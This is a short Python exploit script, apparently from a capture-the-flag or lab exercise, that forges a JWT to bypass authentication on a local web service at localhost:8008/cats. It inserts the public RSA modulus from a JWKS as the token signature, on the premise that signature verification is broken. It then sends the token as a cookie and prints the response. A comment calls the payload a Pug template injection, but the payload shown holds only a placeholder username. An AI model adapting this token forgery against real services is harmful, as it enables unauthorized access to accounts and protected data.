import base64
import json
import requests

# JWKS data from /jwks.json
jwks = {
    "keys": [{
        "kty": "RSA",
        "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
        "e": "AQAB",
        "alg": "RS256",
        "use": "sig"
    }]
}

def base64url_encode(data):
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    elif isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Create JWT parts
header = {
    "typ": "JWT",
    "alg": "RS256",
    "kid": jwks["keys"][0]["n"][:8]  # Use first 8 chars of 'n' as key ID
}

# Pug template injection payload
payload = {
    "username": "cccccccccccc",
}

# Encode header and payload
header_encoded = base64url_encode(header)
payload_encoded = base64url_encode(payload)

# Use the public key modulus as signature (since verification is broken)
signature = jwks["keys"][0]["n"]

# Create the JWT
jwt = f"{header_encoded}.{payload_encoded}.{signature}"

# Target URL 
url = "http://localhost:8008/cats"  # Adjust if needed

# Make request with our forged token
cookies = {
    "token": jwt
}

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
}

print("Forged Token:", jwt)
print("\nMaking request...")

response = requests.get(url, cookies=cookies, headers=headers)
print("Status Code:", response.status_code)
print("Response:", response.text)